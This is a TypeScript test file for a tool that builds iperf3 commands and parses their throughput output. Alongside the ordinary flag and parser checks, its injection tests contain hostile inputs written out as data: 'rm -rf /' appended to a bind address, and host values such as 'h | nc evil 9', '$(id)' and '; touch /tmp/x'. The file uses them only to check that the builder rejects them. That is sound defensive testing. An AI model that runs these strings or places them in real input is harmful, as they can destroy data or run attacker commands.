import assert from "node:assert";
import {
  DEFAULT_IPERF3_OPTIONS,
  buildIperf3Command,
  buildIperf3Parts,
  parseIperf3Summary,
  type Iperf3Options,
} from "../../client/src/lib/toolkit/iperf3-command-builder.ts";

function opts(patch: Partial<Iperf3Options>): Iperf3Options {
  return { ...DEFAULT_IPERF3_OPTIONS, ...patch };
}

// Server command.
assert.strictEqual(buildIperf3Command(opts({ role: "server" })), "iperf3 -s");
assert.strictEqual(
  buildIperf3Command(opts({ role: "server", port: "5202", ipVersion: "6" })),
  "iperf3 -s -p 5202 -6",
);

// Default client: duration 10, interval 1, one stream are all defaults and omitted.
assert.strictEqual(buildIperf3Command(opts({ host: "10.0.0.1" })), "iperf3 -c 10.0.0.1");

// A full UDP client.
assert.strictEqual(
  buildIperf3Command(
    opts({
      host: "10.0.0.1",
      protocol: "udp",
      bandwidth: "100M",
      duration: "30",
      parallel: "4",
      reverse: true,
      port: "5201",
      json: true,
    }),
  ),
  "iperf3 -c 10.0.0.1 -u -b 100M -t 30 -P 4 -R -J",
);

// Bidir, window and MSS.
assert.strictEqual(
  buildIperf3Command(opts({ host: "h", bidir: true, window: "512K", mss: "1400", interval: "2" })),
  "iperf3 -c h --bidir -w 512K -M 1400 -i 2",
);

// Bind address and IPv4.
assert.strictEqual(
  buildIperf3Command(opts({ host: "h", ipVersion: "4", bind: "192.168.1.5" })),
  "iperf3 -c h -4 -B 192.168.1.5",
);

// Invalid numeric fields are dropped, not emitted.
assert.strictEqual(buildIperf3Command(opts({ host: "h", parallel: "abc", duration: "-5" })), "iperf3 -c h");

// --- TCP summary parsing, values from a real iperf3 run. ---
const tcp = `
Connecting to host 10.0.0.1, port 5201
[  5] local 10.0.0.2 port 51524 connected to 10.0.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-1.00   sec   118 MBytes   986 Mbits/sec    0    328 KBytes
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec  1.09 GBytes   938 Mbits/sec    3             sender
[  5]   0.00-10.00  sec  1.09 GBytes   934 Mbits/sec                  receiver
`;
const tcpSummary = parseIperf3Summary(tcp);
assert.strictEqual(tcpSummary.protocol, "tcp");
assert.ok(tcpSummary.sender);
assert.ok(tcpSummary.receiver);
assert.strictEqual(tcpSummary.sender!.bitrate, "938 Mbits/sec");
assert.strictEqual(tcpSummary.sender!.bitrateMbps, 938);
assert.strictEqual(tcpSummary.sender!.retransmits, 3);
assert.strictEqual(tcpSummary.receiver!.bitrateMbps, 934);
assert.strictEqual(tcpSummary.receiver!.retransmits, null);

// A Gbits receiver normalizes to Mbit/s.
const gig = `[  5]   0.00-10.00  sec  2.30 GBytes  1.98 Gbits/sec  0  sender
[  5]   0.00-10.00  sec  2.29 GBytes  1.97 Gbits/sec     receiver`;
const gigSummary = parseIperf3Summary(gig);
assert.strictEqual(gigSummary.sender!.bitrateMbps, 1980);
assert.strictEqual(gigSummary.sender!.retransmits, 0);
assert.strictEqual(gigSummary.receiver!.bitrateMbps, 1970);

// --- UDP summary parsing with jitter and loss. ---
const udp = `
[ ID] Interval           Transfer     Bitrate         Jitter    Lost/Total Datagrams
[  5]   0.00-10.00  sec  1.25 MBytes  1.05 Mbits/sec  0.000 ms  0/906 (0%)  sender
[  5]   0.00-10.00  sec  1.21 MBytes  1.02 Mbits/sec  0.085 ms  30/906 (3.3%)  receiver
`;
const udpSummary = parseIperf3Summary(udp);
assert.strictEqual(udpSummary.protocol, "udp");
assert.strictEqual(udpSummary.receiver!.jitterMs, 0.085);
assert.strictEqual(udpSummary.receiver!.lostDatagrams, 30);
assert.strictEqual(udpSummary.receiver!.totalDatagrams, 906);
assert.strictEqual(udpSummary.receiver!.lossPercent, 3.3);
assert.strictEqual(udpSummary.sender!.lossPercent, 0);
assert.strictEqual(udpSummary.sender!.retransmits, null);

// --- Parallel streams: the [SUM] line is preferred. ---
const par = `
[  5]   0.00-10.00  sec   500 MBytes   419 Mbits/sec   10   sender
[  7]   0.00-10.00  sec   520 MBytes   436 Mbits/sec    8   sender
[SUM]   0.00-10.00  sec  1020 MBytes   855 Mbits/sec   18   sender
[  5]   0.00-10.00  sec   498 MBytes   418 Mbits/sec        receiver
[  7]   0.00-10.00  sec   519 MBytes   435 Mbits/sec        receiver
[SUM]   0.00-10.00  sec  1017 MBytes   853 Mbits/sec        receiver
`;
const parSummary = parseIperf3Summary(par);
assert.strictEqual(parSummary.sender!.isSum, true);
assert.strictEqual(parSummary.sender!.bitrateMbps, 855);
assert.strictEqual(parSummary.sender!.retransmits, 18);
assert.strictEqual(parSummary.receiver!.isSum, true);
assert.strictEqual(parSummary.receiver!.bitrateMbps, 853);

// --- Empty and junk input does not throw. ---
assert.strictEqual(parseIperf3Summary("").rows.length, 0);
assert.strictEqual(parseIperf3Summary("no summary here\njust words").protocol, "unknown");

// Kbits normalize below 1 Mbit/s.
const kbit = `[  5]   0.00-10.00  sec  600 KBytes   500 Kbits/sec    0  sender`;
assert.strictEqual(parseIperf3Summary(kbit).sender!.bitrateMbps, 0.5);

console.log("iperf3-command-builder: all assertions passed");

// ============================================================
// Independent verifier reference cases (added during review).
// ============================================================

// V1. Real default gigabit TCP summary (iperf3 man-page style output):
// 1.10 GBytes over 10 s is 941 Mbit/s, the classic single-stream GbE ceiling.
const vGbe = `
Connecting to host 192.168.1.10, port 5201
[  5] local 192.168.1.20 port 40112 connected to 192.168.1.10 port 5201
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-10.00  sec  1.10 GBytes   941 Mbits/sec    0             sender
[  5]   0.00-10.00  sec  1.10 GBytes   938 Mbits/sec                  receiver
`;
const vGbeS = parseIperf3Summary(vGbe);
assert.strictEqual(vGbeS.protocol, "tcp");
assert.strictEqual(vGbeS.sender!.bitrateMbps, 941);
assert.strictEqual(vGbeS.sender!.retransmits, 0);
assert.strictEqual(vGbeS.sender!.transfer, "1.10 GBytes");
assert.strictEqual(vGbeS.receiver!.bitrateMbps, 938);
assert.strictEqual(vGbeS.receiver!.retransmits, null);

// V2. Bitrate reported in bare bits/sec (no SI prefix) normalizes by 1e6.
const vBare = `[  5]   0.00-10.00  sec  596 MBytes   500000000 bits/sec    0  sender`;
assert.strictEqual(parseIperf3Summary(vBare).sender!.bitrateMbps, 500);

// V3. Tbit/sec boundary normalizes by 1e6 (1 Tbit = 1,000,000 Mbit).
const vTbit = `[  5]   0.00-1.00  sec  120 GBytes  1.00 Tbits/sec   0   sender`;
assert.strictEqual(parseIperf3Summary(vTbit).sender!.bitrateMbps, 1_000_000);

// V4. UDP with heavy loss; percent and datagram fractions preserved exactly.
const vUdpLoss = `
[  5]   0.00-10.00  sec  12.5 MBytes  10.5 Mbits/sec  0.000 ms  0/9000 (0%)  sender
[  5]   0.00-10.00  sec  9.80 MBytes  8.22 Mbits/sec  0.512 ms  1800/9000 (20%)  receiver
`;
const vUdpLossS = parseIperf3Summary(vUdpLoss);
assert.strictEqual(vUdpLossS.protocol, "udp");
assert.strictEqual(vUdpLossS.receiver!.lostDatagrams, 1800);
assert.strictEqual(vUdpLossS.receiver!.totalDatagrams, 9000);
assert.strictEqual(vUdpLossS.receiver!.lossPercent, 20);
assert.strictEqual(vUdpLossS.receiver!.jitterMs, 0.512);
assert.strictEqual(vUdpLossS.receiver!.retransmits, null);

// V5. Server command with bind and JSON, order is role, bind, then JSON.
assert.strictEqual(
  buildIperf3Command(opts({ role: "server", bind: "::1", json: true })),
  "iperf3 -s -B ::1 -J",
);

// V6. UDP client with no target rate still emits -u (iperf3 then uses its 1 Mbit/s default).
assert.strictEqual(
  buildIperf3Command(opts({ host: "h", protocol: "udp", bandwidth: "" })),
  "iperf3 -c h -u",
);

// V7. Decimal size tokens are accepted for -b and -w.
assert.strictEqual(
  buildIperf3Command(opts({ host: "h", bandwidth: "10.5M", window: "1.5M" })),
  "iperf3 -c h -b 10.5M -w 1.5M",
);

// V8. Reverse plus UDP plus explicit duration, correct flag order.
assert.strictEqual(
  buildIperf3Command(opts({ host: "h", protocol: "udp", bandwidth: "1G", duration: "5", reverse: true })),
  "iperf3 -c h -u -b 1G -t 5 -R",
);

// V9. Adversarial bind is rejected (shell metacharacters never reach the string).
assert.strictEqual(buildIperf3Command(opts({ host: "h", bind: "1.2.3.4; rm -rf /" })), "iperf3 -c h");

// The server field is pasted into a terminal, so anything a shell would act on is replaced by a placeholder.
for (const hostile of [
  "server.example; touch /tmp/x",
  "h && id",
  "h | nc evil 9",
  "$(id)",
  "`id`",
  "h'",
  'h"',
  "a b",
  "h\nid",
  "h>out",
  "h#c",
  "h\\x",
  "h*",
]) {
  assert.strictEqual(buildIperf3Command(opts({ host: hostile })), "iperf3 -c HOST", `host ${JSON.stringify(hostile)}`);
}
{
  const parts = buildIperf3Parts(opts({ host: "x; y" }));
  assert.match(parts.flags[0].explanation, /not part of a host name or address/);
}
// Names and addresses that are valid still go through untouched.
for (const good of ["iperf.example.com", "10.0.0.1", "fe80::1%eth0", "2001:db8::1", "my-host_1.lan", "A.B-c.d"]) {
  assert.strictEqual(buildIperf3Command(opts({ host: good })), `iperf3 -c ${good}`, `host ${good}`);
}

// iperf3 refuses -R with --bidir, so the pair never reaches the command; bidirectional stays.
assert.strictEqual(buildIperf3Command(opts({ host: "h", reverse: true, bidir: true })), "iperf3 -c h --bidir");
assert.strictEqual(buildIperf3Command(opts({ host: "h", reverse: true })), "iperf3 -c h -R");
assert.strictEqual(buildIperf3Command(opts({ host: "h", bidir: true })), "iperf3 -c h --bidir");
{
  const both = buildIperf3Parts(opts({ host: "h", reverse: true, bidir: true }));
  assert.ok(!both.parts.includes("-R"), "-R is not emitted with --bidir");
  assert.match(both.flags.find((f) => f.flag === "--bidir")!.explanation, /-R is left out/);
}

// V10. Adversarial / unicode / huge input does not throw and yields no rows.
assert.strictEqual(parseIperf3Summary("   \t  \n\n").rows.length, 0);
assert.strictEqual(parseIperf3Summary("☃ sender \u{1F4A9}").rows.length, 0); // "sender" word present but no bitrate
assert.doesNotThrow(() => parseIperf3Summary("sender\n".repeat(100000)));
assert.doesNotThrow(() => parseIperf3Summary("x".repeat(2_000_000)));

// V11. A line that says "sender" but has no bitrate is not counted as a row.
assert.strictEqual(parseIperf3Summary("this is the sender").rows.length, 0);

// Numeric fields follow iperf3's own limits (esnet/iperf src/iperf.h and iperf_error.c).
// -i 0 is real: it turns the periodic reports off, so it must reach the command.
assert.strictEqual(buildIperf3Command(opts({ host: "h", interval: "0" })), "iperf3 -c h -i 0");
assert.ok(buildIperf3Parts(opts({ host: "h", interval: "0" })).flags.some((f) => f.flag === "-i 0" && /off/i.test(f.explanation)));
assert.strictEqual(buildIperf3Command(opts({ host: "h", interval: "0.5" })), "iperf3 -c h -i 0.5");
assert.strictEqual(buildIperf3Command(opts({ host: "h", interval: "60" })), "iperf3 -c h -i 60");
assert.strictEqual(buildIperf3Command(opts({ host: "h", interval: "0.1" })), "iperf3 -c h -i 0.1");
assert.strictEqual(buildIperf3Command(opts({ host: "h", interval: "1.0" })), "iperf3 -c h", "1.0 is the default of 1");
for (const bad of ["0.05", "61", "-1", "1e3", "abc", "1.", ".5"]) {
  const r = buildIperf3Parts(opts({ host: "h", interval: bad }));
  assert.strictEqual(r.parts.join(" "), "iperf3 -c h", `interval ${bad} is left out`);
  assert.strictEqual(r.ignored.length, 1, `interval ${bad} is reported`);
}
// Ports are 1 to 65535.
assert.strictEqual(buildIperf3Command(opts({ role: "server", port: "65535" })), "iperf3 -s -p 65535");
assert.strictEqual(buildIperf3Command(opts({ role: "server", port: "1" })), "iperf3 -s -p 1");
for (const bad of ["0", "65536", "70000", "99999999999999999999", "-5", "80.5", "08x"]) {
  const r = buildIperf3Parts(opts({ role: "server", port: bad }));
  assert.strictEqual(r.parts.join(" "), "iperf3 -s", `port ${bad} is left out`);
  assert.strictEqual(r.ignored.length, 1, `port ${bad} is reported`);
}
// The same limits guard duration (1 to 86400), streams (1 to 128) and MSS (1 to 32767).
assert.ok(buildIperf3Command(opts({ host: "h", duration: "86400" })).includes("-t 86400"));
assert.ok(!buildIperf3Command(opts({ host: "h", duration: "86401" })).includes("-t"));
assert.ok(buildIperf3Command(opts({ host: "h", parallel: "128" })).includes("-P 128"));
assert.ok(!buildIperf3Command(opts({ host: "h", parallel: "129" })).includes("-P"));
assert.ok(buildIperf3Command(opts({ host: "h", mss: "32767" })).includes("-M 32767"));
assert.ok(!buildIperf3Command(opts({ host: "h", mss: "32768" })).includes("-M"));
assert.strictEqual(buildIperf3Parts(opts({ host: "h", duration: "86401", parallel: "129", mss: "32768", port: "70000" })).ignored.length, 4);
// Empty fields mean "default" and are not reported; valid input reports nothing.
assert.deepStrictEqual(buildIperf3Parts(opts({ host: "h", duration: "", parallel: "", mss: "", port: "", interval: "" })).ignored, []);
assert.deepStrictEqual(buildIperf3Parts(opts({ host: "h", duration: "30", parallel: "4", port: "5202" })).ignored, []);
// A typed value with leading zeros is normalized, so "05201" is the default port and "010" seconds is the default 10.
assert.strictEqual(buildIperf3Command(opts({ role: "server", port: "05201" })), "iperf3 -s");
assert.strictEqual(buildIperf3Command(opts({ host: "h", duration: "010" })), "iperf3 -c h");

console.log("iperf3-command-builder: verifier reference cases passed");
